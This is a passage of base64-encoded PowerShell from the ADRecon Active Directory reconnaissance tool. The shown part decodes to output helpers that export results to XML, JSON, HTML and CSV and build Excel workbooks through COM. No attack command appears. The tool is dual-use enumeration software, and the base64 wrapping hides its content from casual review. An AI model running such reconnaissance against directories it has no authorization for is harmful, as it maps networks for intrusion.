QgdG8gYSBYTUwgZmlsZSB1c2luZyBFeHBvcnQtQ2xpeG1sLgoKLlBBUkFNRVRFUiBBRFJPYmoKICAgIFtQU09iamVjdF0KICAgIEFEUk9iagoKLlBBUkFNRVRFUiBBREZpbGVOYW1lCiAgICBbU3RyaW5nXQogICAgUGF0aCB0byBzYXZlIHRoZSBYTUwgRmlsZS4KCi5PVVRQVVRTCiAgICBYTUwgZmlsZS4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1BTT2JqZWN0XSAkQURST2JqLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddICRBREZpbGVOYW1lCiAgICApCgogICAgVHJ5CiAgICB7CiAgICAgICAgKENvbnZlcnRUby1YbWwgLU5vVHlwZUluZm9ybWF0aW9uIC1JbnB1dE9iamVjdCAkQURST2JqKS5TYXZlKCRBREZpbGVOYW1lKQogICAgfQogICAgQ2F0Y2gKICAgIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJbRXhwb3J0LUFEUlhNTF0gRmFpbGVkIHRvIGV4cG9ydCAkKCRBREZpbGVOYW1lKS4iCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICB9Cn0KCkZ1bmN0aW9uIEV4cG9ydC1BRFJKU09OCnsKPCMKLlNZTk9QU0lTCiAgICBFeHBvcnRzIE9iamVjdCB0byBhIEpTT04gZmlsZS4KCi5ERVNDUklQVElPTgogICAgRXhwb3J0cyBPYmplY3QgdG8gYSBKU09OIGZpbGUgdXNpbmcgQ29udmVydFRvLUpzb24uCgouUEFSQU1FVEVSIEFEUk9iagogICAgW1BTT2JqZWN0XQogICAgQURST2JqCgouUEFSQU1FVEVSIEFERmlsZU5hbWUKICAgIFtTdHJpbmddCiAgICBQYXRoIHRvIHNhdmUgdGhlIEpTT04gRmlsZS4KCi5PVVRQVVRTCiAgICBKU09OIGZpbGUuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtQU09iamVjdF0gJEFEUk9iaiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXSAkQURGaWxlTmFtZQogICAgKQoKICAgIFRyeQogICAgewogICAgICAgIENvbnZlcnRUby1KU09OIC1JbnB1dE9iamVjdCAkQURST2JqIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRBREZpbGVOYW1lCiAgICB9CiAgICBDYXRjaAogICAgewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltFeHBvcnQtQURSSlNPTl0gRmFpbGVkIHRvIGV4cG9ydCAkKCRBREZpbGVOYW1lKS4iCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICB9Cn0KCkZ1bmN0aW9uIEV4cG9ydC1BRFJIVE1MCnsKPCMKLlNZTk9QU0lTCiAgICBFeHBvcnRzIE9iamVjdCB0byBhIEhUTUwgZmlsZS4KCi5ERVNDUklQVElPTgogICAgRXhwb3J0cyBPYmplY3QgdG8gYSBIVE1MIGZpbGUgdXNpbmcgQ29udmVydFRvLUh0bWwuCgouUEFSQU1FVEVSIEFEUk9iagogICAgW1BTT2JqZWN0XQogICAgQURST2JqCgouUEFSQU1FVEVSIEFERmlsZU5hbWUKICAgIFtTdHJpbmddCiAgICBQYXRoIHRvIHNhdmUgdGhlIEhUTUwgRmlsZS4KCi5PVVRQVVRTCiAgICBIVE1MIGZpbGUuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtQU09iamVjdF0gJEFEUk9iaiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXSAkQURGaWxlTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtTdHJpbmddICRBRFJPdXRwdXREaXIgPSAkbnVsbAogICAgKQoKJEhlYWRlciA9IEAiCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CnRoIHsKCWNvbG9yOndoaXRlOwoJYmFja2dyb3VuZC1jb2xvcjpibHVlOwp9CnRkLCB0aCB7Cglib3JkZXI6MHB4IHNvbGlkIGJsYWNrOwoJYm9yZGVyLWNvbGxhcHNlOmNvbGxhcHNlOwoJd2hpdGUtc3BhY2U6cHJlOwp9CnRyOm50aC1jaGlsZCgybisxKSB7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZGRkZGRkOwp9CnRyOmhvdmVyIHRkIHsKICAgIGJhY2tncm91bmQtY29sb3I6ICNjMWQ1Zjg7Cn0KdGFibGUsIHRyLCB0ZCwgdGggewoJcGFkZGluZzogMHB4OwoJbWFyZ2luOiAwcHg7Cgl3aGl0ZS1zcGFjZTpwcmU7Cn0KdGFibGUgewoJbWFyZ2luLWxlZnQ6MXB4Owp9Cjwvc3R5bGU+CiJACiAgICBUcnkKICAgIHsKICAgICAgICBJZiAoJEFERmlsZU5hbWUuQ29udGFpbnMoIkluZGV4IikpCiAgICAgICAgewogICAgICAgICAgICAkSFRNTFBhdGggID0gLWpvaW4oJEFEUk91dHB1dERpciwnXCcsJ0hUTUwtRmlsZXMnKQogICAgICAgICAgICAkSFRNTFBhdGggPSAkKChDb252ZXJ0LVBhdGggJEhUTUxQYXRoKS5UcmltRW5kKCJcIikpCiAgICAgICAgICAgICRIVE1MRmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRIVE1MUGF0aCAtbmFtZQogICAgICAgICAgICAkSFRNTCA9ICRIVE1MRmlsZXMgfCBDb252ZXJ0VG8tSFRNTCAtVGl0bGUgIkFEUmVjb24iIC1Qcm9wZXJ0eSBAe0xhYmVsPSJUYWJsZSBvZiBDb250ZW50cyI7RXhwcmVzc2lvbj17IjxhIGhyZWY9JyQoJF8pJz4kKCRfKTwvYT4ifX0gLUhlYWQgJEhlYWRlcgoKICAgICAgICAgICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2ViCiAgICAgICAgICAgIFtTeXN0ZW0uV2ViLkh0dHBVdGlsaXR5XTo6SHRtbERlY29kZSgkSFRNTCkgfCBPdXQtRmlsZSAtRmlsZVBhdGggJEFERmlsZU5hbWUKICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgSWYgKCRBRFJPYmogLWlzIFthcnJheV0pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBRFJPYmogfCBTZWxlY3QtT2JqZWN0ICogfCBDb252ZXJ0VG8tSFRNTCAtQXMgVGFibGUgLUhlYWQgJEhlYWRlciB8IE91dC1GaWxlIC1GaWxlUGF0aCAkQURGaWxlTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ29udmVydFRvLUhUTUwgLUlucHV0T2JqZWN0ICRBRFJPYmogLUFzIFRhYmxlIC1IZWFkICRIZWFkZXIgfCBPdXQtRmlsZSAtRmlsZVBhdGggJEFERmlsZU5hbWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIENhdGNoCiAgICB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiW0V4cG9ydC1BRFJIVE1MXSBGYWlsZWQgdG8gZXhwb3J0ICQoJEFERmlsZU5hbWUpLiIKICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgIH0KfQoKRnVuY3Rpb24gRXhwb3J0LUFEUgp7CjwjCi5TWU5PUFNJUwogICAgSGVscGVyIGZ1bmN0aW9uIGZvciBhbGwgb3V0cHV0IHR5cGVzIHN1cHBvcnRlZC4KCi5ERVNDUklQVElPTgogICAgSGVscGVyIGZ1bmN0aW9uIGZvciBhbGwgb3V0cHV0IHR5cGVzIHN1cHBvcnRlZC4KCi5QQVJBTUVURVIgQURPYmplY3RETgogICAgW1BTT2JqZWN0XQogICAgQURST2JqCgouUEFSQU1FVEVSIEFEUk91dHB1dERpcgogICAgW1N0cmluZ10KICAgIFBhdGggZm9yIEFEUmVjb24gb3V0cHV0IGZvbGRlci4KCi5QQVJBTUVURVIgT3V0cHV0VHlwZQogICAgW2FycmF5XQogICAgT3V0cHV0IFR5cGUuCgouUEFSQU1FVEVSIEFEUk1vZHVsZU5hbWUKICAgIFtTdHJpbmddCiAgICBNb2R1bGUgTmFtZS4KCi5PVVRQVVRTCiAgICBTVERPVVQsIENTViwgWE1MLCBKU09OIGFuZC9vciBIVE1MIGZpbGUsIGV0Yy4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtQU09iamVjdF0gJEFEUk9iaiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N0cmluZ10gJEFEUk91dHB1dERpciwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2FycmF5XSAkT3V0cHV0VHlwZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N0cmluZ10gJEFEUk1vZHVsZU5hbWUKICAgICkKCiAgICBTd2l0Y2ggKCRPdXRwdXRUeXBlKQogICAgewogICAgICAgICdTVERPVVQnCiAgICAgICAgewogICAgICAgICAgICBJZiAoJEFEUk1vZHVsZU5hbWUgLW5lICJBYm91dEFEUmVjb24iKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBJZiAoJEFEUk9iaiAtaXMgW2FycmF5XSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAjIEZpeCBmb3IgSW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbjogVGhlIG9iamVjdCBvZiB0eXBlICJNaWNyb3NvZnQuUG93ZXJTaGVsbC5Db21tYW5kcy5JbnRlcm5hbC5Gb3JtYXQuRm9ybWF0U3RhcnREYXRhIiBpcyBub3QgdmFsaWQgb3Igbm90IGluIHRoZSBjb3JyZWN0IHNlcXVlbmNlLgogICAgICAgICAgICAgICAgICAgICRBRFJPYmogfCBPdXQtU3RyaW5nIC1TdHJlYW0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAjIEZpeCBmb3IgSW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbjogVGhlIG9iamVjdCBvZiB0eXBlICJNaWNyb3NvZnQuUG93ZXJTaGVsbC5Db21tYW5kcy5JbnRlcm5hbC5Gb3JtYXQuRm9ybWF0U3RhcnREYXRhIiBpcyBub3QgdmFsaWQgb3Igbm90IGluIHRoZSBjb3JyZWN0IHNlcXVlbmNlLgogICAgICAgICAgICAgICAgICAgICRBRFJPYmogfCBGb3JtYXQtTGlzdCB8IE91dC1TdHJpbmcgLVN0cmVhbQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICdDU1YnCiAgICAgICAgewogICAgICAgICAgICAkQURGaWxlTmFtZSAgPSAtam9pbigkQURST3V0cHV0RGlyLCdcJywnQ1NWLUZpbGVzJywnXCcsJEFEUk1vZHVsZU5hbWUsJy5jc3YnKQogICAgICAgICAgICBFeHBvcnQtQURSQ1NWIC1BRFJPYmogJEFEUk9iaiAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgIH0KICAgICAgICAnWE1MJwogICAgICAgIHsKICAgICAgICAgICAgJEFERmlsZU5hbWUgID0gLWpvaW4oJEFEUk91dHB1dERpciwnXCcsJ1hNTC1GaWxlcycsJ1wnLCRBRFJNb2R1bGVOYW1lLCcueG1sJykKICAgICAgICAgICAgRXhwb3J0LUFEUlhNTCAtQURST2JqICRBRFJPYmogLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICB9CiAgICAgICAgJ0pTT04nCiAgICAgICAgewogICAgICAgICAgICAkQURGaWxlTmFtZSAgPSAtam9pbigkQURST3V0cHV0RGlyLCdcJywnSlNPTi1GaWxlcycsJ1wnLCRBRFJNb2R1bGVOYW1lLCcuanNvbicpCiAgICAgICAgICAgIEV4cG9ydC1BRFJKU09OIC1BRFJPYmogJEFEUk9iaiAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgIH0KICAgICAgICAnSFRNTCcKICAgICAgICB7CiAgICAgICAgICAgICRBREZpbGVOYW1lICA9IC1qb2luKCRBRFJPdXRwdXREaXIsJ1wnLCdIVE1MLUZpbGVzJywnXCcsJEFEUk1vZHVsZU5hbWUsJy5odG1sJykKICAgICAgICAgICAgRXhwb3J0LUFEUkhUTUwgLUFEUk9iaiAkQURST2JqIC1BREZpbGVOYW1lICRBREZpbGVOYW1lIC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpcgogICAgICAgIH0KICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUkV4Y2VsQ29tT2JqCnsKPCMKLlNZTk9QU0lTCiAgICBDcmVhdGVzIGEgQ29tT2JqZWN0IHRvIGludGVyYWN0IHdpdGggTWljcm9zb2Z0IEV4Y2VsLgoKLkRFU0NSSVBUSU9OCiAgICBDcmVhdGVzIGEgQ29tT2JqZWN0IHRvIGludGVyYWN0IHdpdGggTWljcm9zb2Z0IEV4Y2VsIGlmIGluc3RhbGxlZCwgZWxzZSB3YXJuaW5nIGlzIHJhaXNlZC4KCi5PVVRQVVRTCiAgICBbU3lzdGVtLl9fQ29tT2JqZWN0XSBhbmQgW1N5c3RlbS5NYXJzaGFsQnlSZWZPYmplY3RdCiAgICBDcmVhdGVzIGdsb2JhbCB2YXJpYWJsZXMgJGV4Y2VsIGFuZCAkd29ya2Jvb2suCiM+CgogICAgI0NoZWNrIGlmIEV4Y2VsIGlzIGluc3RhbGxlZC4KICAgIFRyeQogICAgewogICAgICAgICMgU3VwcHJlc3MgdmVyYm9zZSBvdXRwdXQKICAgICAgICAkU2F2ZVZlcmJvc2VQcmVmZXJlbmNlID0gJHNjcmlwdDpWZXJib3NlUHJlZmVyZW5jZQogICAgICAgICRzY3JpcHQ6VmVyYm9zZVByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKICAgICAgICAkZ2xvYmFsOmV4Y2VsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IGV4Y2VsLmFwcGxpY2F0aW9uCiAgICAgICAgSWYgKCRTYXZlVmVyYm9zZVByZWZlcmVuY2UpCiAgICAgICAgewogICAgICAgICAgICAkc2NyaXB0OlZlcmJvc2VQcmVmZXJlbmNlID0gJFNhdmVWZXJib3NlUHJlZmVyZW5jZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgU2F2ZVZlcmJvc2VQcmVmZXJlbmNlCiAgICAgICAgfQogICAgfQogICAgQ2F0Y2gKICAgIHsKICAgICAgICBJZiAoJFNhdmVWZXJib3NlUHJlZmVyZW5jZSkKICAgICAgICB7CiAgICAgICAgICAgICRzY3JpcHQ6VmVyYm9zZVByZWZlcmVuY2UgPSAkU2F2ZVZlcmJvc2VQcmVmZXJlbmNlCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBTYXZlVmVyYm9zZVByZWZlcmVuY2UKICAgICAgICB9CiAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJFeGNlbENvbU9ial0gRXhjZWwgZG9lcyBub3QgYXBwZWFyIHRvIGJlIGluc3RhbGxlZC4gU2tpcHBpbmcgZ2VuZXJhdGlvbiBvZiBBRFJlY29uLVJlcG9ydC54bHN4LiBVc2UgdGhlIC1HZW5FeGNlbCBwYXJhbWV0ZXIgdG8gZ2VuZXJhdGUgdGhlIEFEUmVjb24tUmVwb3J0LnhzbHggb24gYSBob3N0IHdpdGggTWljcm9zb2Z0IEV4Y2VsIGluc3RhbGxlZC4iCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgUmV0dXJuICRudWxsCiAgICB9CiAgICAkZXhjZWwuVmlzaWJsZSA9ICR0cnVlCiAgICAkZXhjZWwuSW50ZXJhY3RpdmUgPSAkZmFsc2UKICAgICRnbG9iYWw6d29ya2Jvb2sgPSAkZXhjZWwuV29ya2Jvb2tzLkFkZCgpCiAgICBJZiAoJHdvcmtib29rLldvcmtzaGVldHMuQ291bnQgLWVxIDMpCiAgICB7CiAgICAgICAgJHdvcmtib29rLldvcmtTaGVldHMuSXRlbSgzKS5EZWxldGUoKQogICAgICAgICR3b3JrYm9vay5Xb3JrU2hlZXRzLkl0ZW0oMikuRGVsZXRlKCkKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZQp7CjwjCi5TWU5PUFNJUwogICAgUmVsZWFzZXMgdGhlIENvbU9iamVjdCBjcmVhdGVkIHRvIGludGVyYWN0IHdpdGggTWljcm9zb2Z0IEV4Y2VsLgoKLkRFU0NSSVBUSU9OCiAgICBSZWxlYXNlcyB0aGUgQ29tT2JqZWN0IGNyZWF0ZWQgdG8gaW50ZXJhY3Qgd2l0aCBNaWNyb3NvZnQgRXhjZWwuCgouUEFSQU1FVEVSIENvbU9ianRvUmVsZWFzZQogICAgQ29tT2JqdG9SZWxlYXNlCgouUEFSQU1FVEVSIEZpbmFsCiAgICBGaW5hbAojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgJENvbU9ianRvUmVsZWFzZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtib29sXSAkRmluYWwgPSAkZmFsc2UKICAgICkKICAgICMgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9zeXN0ZW0ucnVudGltZS5pbnRlcm9wc2VydmljZXMubWFyc2hhbC5yZWxlYXNlY29tb2JqZWN0KHY9dnMuMTEwKS5hc3B4CiAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvc3lzdGVtLnJ1bnRpbWUuaW50ZXJvcHNlcnZpY2VzLm1hcnNoYWwuZmluYWxyZWxlYXNlY29tb2JqZWN0KHY9dnMuMTEwKS5hc3B4CiAgICBJZiAoJEZpbmFsKQogICAgewogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZpbmFsUmVsZWFzZUNvbU9iamVjdCgkQ29tT2JqdG9SZWxlYXNlKSB8IE91dC1OdWxsCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVsZWFzZUNvbU9iamVjdCgkQ29tT2JqdG9SZWxlYXNlKSB8IE91dC1OdWxsCiAgICB9CiAgICBbU3lzdGVtLkdDXTo6Q29sbGVjdCgpCiAgICBbU3lzdGVtLkdDXTo6V2FpdEZvclBlbmRpbmdGaW5hbGl6ZXJzKCkKfQoKRnVuY3Rpb24gR2V0LUFEUkV4Y2VsV29ya2Jvb2sKewo8IwouU1lOT1BTSVMKICAgIEFkZHMgYSBXb3JrU2hlZXQgdG8gdGhlIFdvcmtib29rLgoKLkRFU0NSSVBUSU9OCiAgICBBZGRzIGEgV29ya1NoZWV0IHRvIHRoZSBXb3JrYm9vayB1c2luZyB0aGUgJHdvcmtib29vayBnbG9iYWwgdmFyaWFibGUgYW5kIGFzc2lnbnMgaXQgYSBuYW1lLgoKLlBBUkFNRVRFUiBuYW1lCiAgICBbc3RyaW5nXQogICAgTmFtZSBvZiB0aGUgV29ya1NoZWV0LgojPgogICAgcGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRuYW1lCiAgICApCgogICAgJHdvcmtib29rLldvcmtzaGVldHMuQWRkKCkgfCBPdXQtTnVsbAogICAgJHdvcmtzaGVldCA9ICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkKICAgICR3b3Jrc2hlZXQuTmFtZSA9ICRuYW1lCgogICAgR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZSAtQ29tT2JqdG9SZWxlYXNlICR3b3Jrc2hlZXQKICAgIFJlbW92ZS1WYXJpYWJsZSB3b3Jrc2hlZXQKfQoKRnVuY3Rpb24gR2V0LUFEUkV4Y2VsSW1wb3J0CnsKPCMKLlNZTk9QU0lTCiAgICBIZWxwZXIgdG8gaW1wb3J0IENTViB0byB0aGUgY3VycmVudCBXb3JrU2hlZXQuCgouREVTQ1JJUFRJT04KICAgIEhlbHBlciB0byBpbXBvcnQgQ1NWIHRvIHRoZSBjdXJyZW50IFdvcmtTaGVldC4gU3VwcG9ydHMgdHdvIG1ldGhvZHMuCgouUEFSQU1FVEVSIEFERmlsZU5hbWUKICAgIFtzdHJpbmddCiAgICBGaWxlbmFtZSBvZiB0aGUgQ1NWIGZpbGUgdG8gaW1wb3J0LgoKLlBBUkFNRVRFUiBtZXRob2QKICAgIFtpbnRdCiAgICBNZXRob2QgdG8gdXNlIGZvciB0aGUgaW1wb3J0LgoKLlBBUkFNRVRFUiByb3cKICAgIFtpbnRdCiAgICBSb3cuCgouUEFSQU1FVEVSIGNvbHVtbgogICAgW2ludF0KICAgIENvbHVtbi4KIz4KICAgIHBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkQURGaWxlTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtpbnRdICRtZXRob2QgPSAxLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2ludF0gJHJvdyA9IDEsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkY29sdW1uID0gMQogICAgKQoKICAgICRleGNlbC5TY3JlZW5VcGRhdGluZyA9ICRmYWxzZQogICAgSWYgKCRtZXRob2QgLWVxIDEpCiAgICB7CiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgICR3b3Jrc2hlZXQgPSAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpCiAgICAgICAgICAgICRUeHRDb25uZWN0b3IgPSAoIlRFWFQ7IiArICRBREZpbGVOYW1lKQogICAgICAgICAgICAkQ2VsbFJlZiA9ICR3b3Jrc2hlZXQuUmFuZ2UoIkExIikKICAgICAgICAgICAgI0J1aWxkLCB1c2UgYW5kIHJlbW92ZSB0aGUgdGV4dCBmaWxlIGNvbm5lY3RvcgogICAgICAgICAgICAkQ29ubmVjdG9yID0gJHdvcmtzaGVldC5RdWVyeVRhYmxlcy5hZGQoJFR4dENvbm5lY3RvciwgJENlbGxSZWYpCgogICAgICAgICAgICAjNjUwMDE6IFVuaWNvZGUgKFVURi04KQogICAgICAgICAgICAkd29ya3NoZWV0LlF1ZXJ5VGFibGVzLml0ZW0oJENvbm5lY3Rvci5uYW1lKS5UZXh0RmlsZVBsYXRmb3JtID0gNjUwMDEKICAgICAgICAgICAgJHdvcmtzaGVldC5RdWVyeVRhYmxlcy5pdGVtKCRDb25uZWN0b3IubmFtZSkuVGV4dEZpbGVDb21tYURlbGltaXRlciA9ICRUcnVlCiAgICAgICAgICAgICR3b3Jrc2hlZXQuUXVlcnlUYWJsZXMuaXRlbSgkQ29ubmVjdG9yLm5hbWUpLlRleHRGaWxlUGFyc2VUeXBlID0gMQogICAgICAgICAgICAkd29ya3NoZWV0LlF1ZXJ5VGFibGVzLml0ZW0oJENvbm5lY3Rvci5uYW1lKS5SZWZyZXNoKCkgfCBPdXQtTnVsbAogICAgICAgICAgICAkd29ya3NoZWV0LlF1ZXJ5VGFibGVzLml0ZW0oJENvbm5lY3Rvci5uYW1lKS5kZWxldGUoKQoKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZSAtQ29tT2JqdG9SZWxlYXNlICRDZWxsUmVmCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBDZWxsUmVmCiAgICAgICAgICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkQ29ubmVjdG9yCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBDb25uZWN0b3IKCiAgICAgICAgICAgICRsaXN0T2JqZWN0ID0gJHdvcmtzaGVldC5MaXN0T2JqZWN0cy5BZGQoW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbExpc3RPYmplY3RTb3VyY2VUeXBlXTo6eGxTcmNSYW5nZSwgJHdvcmtzaGVldC5Vc2VkUmFuZ2UsICRudWxsLCBbTWljcm9zb2Z0Lk9mZmljZS5JbnRlcm9wLkV4Y2VsLlhsWWVzTm9HdWVzc106OnhsWWVzLCAkbnVsbCkKICAgICAgICAgICAgJGxpc3RPYmplY3QuVGFibGVTdHlsZSA9ICJUYWJsZVN0eWxlTGlnaHQyIiAjIFN0eWxlIENoZWF0IFNoZWV0OiBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi1hdS9saWJyYXJ5L2RvY3VtZW50Zm9ybWF0Lm9wZW54bWwuc3ByZWFkc2hlZXQudGFibGVzdHlsZS5hc3B4CiAgICAgICAgICAgICR3b3Jrc2hlZXQuVXNlZFJhbmdlLkVudGlyZUNvbHVtbi5BdXRvRml0KCkgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgfQogICAgRWxzZWlmICgkbWV0aG9kIC1lcSAyKQogICAgewogICAgICAgICR3b3Jrc2hlZXQgPSAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgICRBRFRlbXAgPSBJbXBvcnQtQ3N2IC1QYXRoICRBREZpbGVOYW1lCiAgICAgICAgICAgICRBRFRlbXAgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBGb3JlYWNoICgkcHJvcCBpbiAkXy5QU09iamVjdC5Qcm9wZXJ0aWVzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgkcm93LCAkY29sdW1uKSA9ICRwcm9wLk5hbWUKICAgICAgICAgICAgICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbiArIDEpID0gJHByb3AuVmFsdWUKICAgICAgICAgICAgICAgICAgICAkcm93KysKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURUZW1wCiAgICAgICAgICAgICRsaXN0T2JqZWN0ID0gJHdvcmtzaGVldC5MaXN0T2JqZWN0cy5BZGQoW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbExpc3RPYmplY3RTb3VyY2VUeXBlXTo6eGxTcmNSYW5nZSwgJHdvcmtzaGVldC5Vc2VkUmFuZ2UsICRudWxsLCBbTWljcm9zb2Z0Lk9mZmljZS5JbnRlcm9wLkV4Y2VsLlhsWWVzTm9HdWVzc106OnhsWWVzLCAkbnVsbCkKICAgICAgICAgICAgJGxpc3RPYmplY3QuVGFibGVTdHlsZSA9ICJUYWJsZVN0eWxlTGlnaHQyIiAjIFN0eWxlIENoZWF0IFNoZWV0OiBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi1hdS9saWJyYXJ5L2RvY3VtZW50Zm9ybWF0Lm9wZW54bWwuc3ByZWFkc2hlZXQudGFibGVzdHlsZS5hc3B4CiAgICAgICAgICAgICR1c2VkUmFuZ2UgPSAkd29ya3NoZWV0LlVzZWRSYW5nZQogICAgICAgICAgICAkdXNlZFJhbmdlLkVudGlyZUNvbHVtbi5BdXRvRml0KCkgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBFbHNlCiAgICAgICAgewogICAgICAgICAgICAkd29